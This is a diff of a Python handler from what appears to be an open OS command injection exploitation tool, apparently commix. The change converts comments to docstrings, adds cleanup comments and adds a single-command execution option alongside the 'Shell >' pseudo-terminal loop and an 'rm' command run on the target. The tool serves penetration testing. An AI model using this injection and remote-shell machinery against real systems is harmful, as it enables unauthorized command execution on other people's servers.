@@ -43,9 +43,9 @@ from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_ha
  The "file-based" technique on Semiblind-based OS Command Injection.
 """
 
-
-# If temp-based technique failed, 
-# use the "/tmp/" directory for tempfile-based technique.
+"""
+If temp-based technique failed, use the "/tmp/" directory for tempfile-based technique.
+"""
 def tfb_controller(no_result, url, delay, filename, tmp_path, http_request_method, url_time_response):
   if no_result == True:
     sys.stdout.write("(*) Trying to upload file, on temporary directory (" + tmp_path + ")...\n")
@@ -54,8 +54,9 @@ def tfb_controller(no_result, url, delay, filename, tmp_path, http_request_metho
     sys.stdout.write("\r")
     sys.stdout.flush()
 
-
-# Delete previous shells outputs.
+"""
+Delete previous shells outputs.
+"""
 def delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell):
   cmd = "rm " + OUTPUT_TEXTFILE
   response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell=None)
@@ -228,6 +229,7 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
                 sys.exit(0)
           
         except KeyboardInterrupt:
+          # Delete previous shell (text) files (output)
           delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
           raise
         
@@ -273,6 +275,14 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
           # Check for any system file access options.
           fb_file_access.do_check(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
           
+          # Check if defined single cmd.
+          if menu.options.os_cmd:
+            fb_enumeration.single_os_cmd_exec(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+            
+            # Delete previous shell (text) files (output)
+            delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
+            sys.exit(0)
+
           try:
             while True:
               # Pseudo-Terminal shell
@@ -283,6 +293,7 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
                 while True:
                   cmd = raw_input("Shell > ")
                   if cmd == "q":
+                    # Delete previous shell (text) files (output)
                     delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
                     logs.logs_notification(filename)
                     sys.exit(0)
@@ -298,6 +309,7 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
                       print Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL + "\n"
                     
               elif gotshell in settings.CHOISE_NO:
+                # Delete previous shell (text) files (output)
                 delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
                 if menu.options.verbose:
                   sys.stdout.write("\r\n(*) Continue testing the "+ technique +"... ")
@@ -311,6 +323,7 @@ def fb_injection_handler(url, delay, filename, http_request_method, url_time_res
                 pass
             
           except KeyboardInterrupt: 
+            # Delete previous shell (text) files (output)
             delete_previous_shell(separator, payload, TAG, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell)
             raise
             
